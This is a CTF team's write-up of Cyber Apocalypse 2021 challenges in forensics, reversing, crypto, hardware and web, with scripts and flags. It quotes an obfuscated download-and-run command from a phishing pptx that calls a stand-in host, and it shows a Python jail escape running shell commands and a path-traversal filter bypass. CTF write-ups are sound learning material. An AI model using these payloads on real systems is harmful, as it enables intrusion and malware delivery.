<p align="center"> ### Cyber Apocalyspe, April 2021 documentation ### </p>
<p align="center"> ### Placement: 383 / 4740 ### </p>
<br/><br/>

- [FORENSICS](#forensics)
  - [Key mission](#key-mission)
  - [AlienPhish](#alienphish)
  - [Invitation](#invitation)
- [MISC](#misc)
  - [Alien Camp](#alien-camp)
  - [Input as a Service](#input-as-a-service)
- [REV](#rev)
  - [Passphrase](#passphrase)
  - [Authenticator](#authenticator)
- [CRYPTO](#crypto)
  - [Nintendo Base64](#nintendo-base64)
  - [PhaseStream 1](#phasestream-1)
  - [PhaseStream 2](#phasestream-2)
  - [PhaseStream 3](#phasestream-3)
  - [PhaseStream 4](#phasestream-4)
- [Hardware](#hardware)
  - [Serial Logs](#serial-logs)
  - [Compromised](#compromised)
  - [Secure](#secure)
- [WEB](#web)
  - [Inspector Gadget](#inspector-gadget)
  - [MiniSTRyplace](#ministryplace)

<br/><br/>

## FORENSICS

### Key mission
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~ Zenode

For this we had to download a pcap called "Key_mission.pcap" noticing in the pcap it was a USB device, typically I would look for the leftover capture data, but this had none!
So I inspected the capture and noticed that each packet had HID data that had a single byte change in every packet. From this I decided to try and use a method I use for other USB data pcaps but change which data is being used.

To extract the relevant data I used the following command.

`shark -r ~/Downloads/key_mission.pcap -Y 'usbhid.data && usb.data_len == 8' -T fields -e usbhid.data | sed 's/../:&/g2' > usbPcapData`

I then ran the script found at https://github.com/TeamRocketIst/ctf-usb-keyboard-parser to parse the data and see if it corresponds to keypresses using `python usbkeyboard.py usbPcapData`. This ran the python script through the data and it worked! The output was:

"I am sending secretary's location over this totally encrypted channel to make sure no one else will be able to read it except of us.
This information is confidential and must not be shared with anyone else. The secretary's hidden location is CHTB{a_plac3_fAr_fAr_away_fr0m_earth}"  

### AlienPhish

Given a pptx file, opening in office 2010 powerpoint we can see that there's a command being run in presentation mode at mouseover.

```
cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"
```

A lot of it is in reverse. http://destroyearth.alien/ does not exist, but the name of that exe file is base64 and in reverse (of the reverse) it yields the flag, `CHTB{pH1sHiNg_w0_m4cr0s???}`.


### Invitation

This was a malicious MS Office macro. It was obfuscated up the wazoo and failed to compile when run. The issue was that a Sub was declared, but a Function was ended. Replacing Function End with Sub End made the macro run sucessfully.

There was no output though. At this point I decided to deobfuscate all the hex, which decoded into base64 which decoded into text. This allowed us to see some commands, but the code was still extremely obfuscated and it seemed like it was run through an additional function and it seemed like a real big headache so I dropped the challenge.

About 5 hours before CTF end I decided to run a virus scan considering this and other degeneracy I ran on my machine for a couple challs. The scan found a modified registry key with the flag of this challenge in it. `C:\WINDOWS\SYSTEM32\TASKS\CHTB{maldocs_are_the_new_meta}`.

## MISC

### Alien Camp

This was another classic netcat parsing challenge. I like these a lot and this was a little more complex than the ones I've done before.

[See code here](https://github.com/jp1995/ctf_docs/blob/main/scripts/alien_camp.py)

### Input as a Service

Given a netcat connection, which asks us if we sound like an alien. It's also a python 2.7 prompt. Typing random words just syntax errors out, so assuming it's a python jail we need to escape. After a couple attempts trying to import os and run `ls` command, I get it with `__import__('os').system("ls")`, which shows the flag.txt file in the working directory.

From there, `open("flag.txt").read()` to get the flag, `CHTB{4li3n5_us3_pyth0n2.X?!}`.

## REV

### Passphrase

Challenge gives us a binary that asks for a passphrase. Opening it up in ghidra we see a bunch of variables with hex values in the unicode character range. Converting to text, we get a string, `3xtr4t3rR3stR14L5_VS_hum4n5`, which wrapped by CHTB{} makes the flag.

### Authenticator

Another REV binary that asks for credentials, specifically an Alien ID and a PIN. We can find the ID of 11337 by just running strings, but to get further we need to look at the code. Opening the binary in ghidra, the main function directs to a checkpin function that handles the PIN. The significant lines here are:

```c
if ((byte)("}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"[local_24] ^ 9U) != param_1[local_24])
break;
```

For someone with basically no C experience, this can be difficult to comprehend. Basically it's iterating over every char in that string and XORing with 9, and then comparing to every character of user input.

So `} ^ 9` is 74 in hex, the ascii char of t. `a ^ 9` is 68 in hex, corresponding to "h". Wrote a short python script to automate this, and got the flag, `CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}`.

# CRYPTO

### Nintendo Base64

Given a text file that reads nintendo64x0 in ASCII. Copying all the ASCII into a base64 decoder, and then decoding the result over and over again results in flag, `CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}`. Kind of unintuitive for me actually.

### PhaseStream 1

XOR using a repeated 5 byte key. We know the flag starts with CHTB{ so using python and pwntools we can do

```python
from pwn import *
flag = xor(unhex('2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904'), "CHTB{")[:5]
```

key is mykey, string decodes to flag `CHTB{u51ng_kn0wn_pl41nt3xt}`.


### PhaseStream 2

XOR again, however this time we are given a file with 1000 XORed strings and the key is only 1 byte.

```python
from pwn import *
import os

os.chdir('/home/johan/cyber/crypto')

with open ('output.txt', 'r') as file:
    for line in file:
        key = xor(unhex(line), "C")[:1]
        result = b''

        for byte in unhex(line):
            result += bytes([byte ^ ord(key)])

        if b'CHTB{' in result:
            print(f'string: {line}flag: {result} \nkey: {key}')
```

flag `CHTB{n33dl3_1n_4_h4yst4ck}`.


### PhaseStream 3
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~ fel

After a lot of googling about AES and various methods of encryption I read about the one time pad (OTP) stream cipher method. OTP is perfectly secure *unless* you reuse the key (or that the key is greater than or equal to the length of the message but thats not the issue in this case).

Now knowing that both outputs were encrypted with the same key, we can go about reversing that. First we need to guess the plain text input for one of the messages, but luckily thats already provided for us in the script. One of the test inputs was `No right of private conversation`. 

Now we must XOR the two cipher-text messages provided for us in the output file, once we have that we must then XOR the result with the hex value of the plain text from before at different offsets. Though in our case the offset was at 0. The script to do so is below:

```python
import binascii

with open('output.txt', 'rb') as f:
	content = f.read().split()

known = content[0].strip()
flag = content[1].strip()

knownn = binascii.unhexlify(known)
flagn = binascii.unhexlify(flag)

xor = "".join([chr(ord(x) ^ ord(y)) for (x,y) in zip(knownn, flagn)]) #xor each int of char
word = b'No right of private conversation'

for i in range(len(xor)):
	g = "".join([chr(ord(x) ^ (ord(y) << i)) for (x,y) in zip(xor, word)])
	print 'Offset['+str(i)+']: ' + g
```

Running this gives us the following output:
```zsh
➜  cryptops3 python xor.py
Offset[0]: CHTB{r3u53d_k3Y_4TT4cK}
Offset[1]: 茸4ﾔﾀﾛ矩Uば?詹簀諒焄ﾆ昕
```
and there's our key!

### PhaseStream 4

Just like PhaseStream 3, except the aliens got smarter and didn't give us a plaintext string anymore. So we have two ciphertexts, and from the source code we also know that one of them is a quote, and another is the flag.

A little bit of googling suggests Crib Drag. We can use an online Crib Drag Calculator, https://toolbox.lotusfa.com/crib_drag/.

So, inputting the two ciphertexts, and the flag begins with CHTB{ so using that as initial crib. Mostly the results are all random, but one strikes out, "I alo". Now reversing the crib, and trying words starting with alo. So, I alone gives "CHTB{st" which has to be right. Googling quotes, we find that it's one by that old cult leader Mother Theresa. 

This allows us to get the full flag, `CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attaks}`.

# HARDWARE

For these challs we were given saleae log files, which could be opened and analyzed with the free Saleae Logic 2 software.

### Serial Logs

This was the first hardware challenge, and it took a lot of googling to even get the right software as mentioned above. Additionally, i found a  writeup of a similar challenge.

I followed the example of that challenge, and set up an Async Serial analyser with a common baud rate of 115200. This actually worked and it revealed readable text annotations for roughly the left half of the data. There was nothing significant there though.

So, the other half is using a different baud rate. Turns out there's a very useful extension called "Baud rate estimate" for finding this out, which can be installed inside the software itself.

Using this tool, I find the baud rate for the second half is roughly around 74200. This reveals some parts of the annotation, however the text remains unreadable. Playing with the baud rate a little, I stumble upon the exact correct one, 70150.

The flag is in the last two "parts?" of the signal, `CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}`.

![](https://cdn.discordapp.com/attachments/341454782680137728/834388811466145802/unknown.png)

### Compromised

For this challenge I tried to apply the same Async Serial analyser, but that didn't yield any usable data. Trying I2C, another analysis method, worked though and it wrote a bunch of hex values to the terminal.

![](https://cdn.discordapp.com/attachments/534004815160934410/834403555213180938/unknown.png)

This decodes to `set_maCxH_lTimB{itn_tuo1:110_se73t_2mimn1_nli4mi70t_2to5:_1c0+]<+/4~nr^_yz82Gb3b"4#kU_4+J_5
3M2B14B1dV_5 yS5B7k31VQxm!j@Q52yq)t%# @5%md}S`

There's a flag in there, but it's filled with garbage data. After a while I realise that I can export all of this as a csv file, which as it turns out has more data

![](https://cdn.discordapp.com/attachments/534004815160934410/834404483106603048/unknown.png)

the flag characters are marked with COMMA. short python script to extract them and we have our flag, `CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}`.

### Secure

This is the third hardware chall.

`The keys of the device are stored in an external microSD connected with wiring with the unsecured part of the device enabling us to capture some traces while trying random combinations. Can you recover the key?`

From some research it seems that this might be an SPI (Serial Peripheral Interface) capture, and Logic 2 happens to have an SPI analyser.

The analyser has you set the MOSI, MISO, Clock and Enable channels, we have 4 channels so at first it seems like we need to correctly guess which of those goes for which channel.

This is pretty complicated though since the channels are completely unidentified. Intuitively, Channel 3 looks like a Clock, since it's continuously carrying signal pretty much throughout the entire capture. Channel 2 looks basically dead, which would leave Channel 0 and 1 to be the actual data carrying MOSI and MISO.

After trying some combinations, we see some plaintext combined with random garbage bytes on Channel 0 set to MOSI. Stuff like `BOOTMGR`,  `Remove disks or other media`, `SECRET KEY`, `MASTER KEY` so we're clearly getting some data out.  The flag is near the end of the capture, `CHTB{5P1_15_c0mm0n_0n_m3m02y_d3v1c35_!@52}`.

## Web

### Inspector Gadget

Very basic web chall using devtools. Site has the beginning of the flag, `CHTB{` in plaintext. `1nsp3ction_` as an HTML comment. `c4n_r3ve4l` in css file. `us3full_1nf0rm4tion}` in console.

### MiniSTRyplace

Taken to a website where we can choose the language dynamically. Looking at the given source, there's a significant bit:

```php
$lang = ['en.php', 'qw.php'];
    include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
?>
```

So we can just access files on the server from the site. The only validation done is to replace `../` with an empty string, but we can easily bypass this with `....//` which functions identically.

we can also see that the flag file is up two directories from the index.php file. So, `?lang=....//....//flag` yields flag, `CHTB{b4d_4li3n_pr0gr4m1ng}`.

## Useful stuff

https://toolbox.lotusfa.com/crib_drag/

Saleae logs


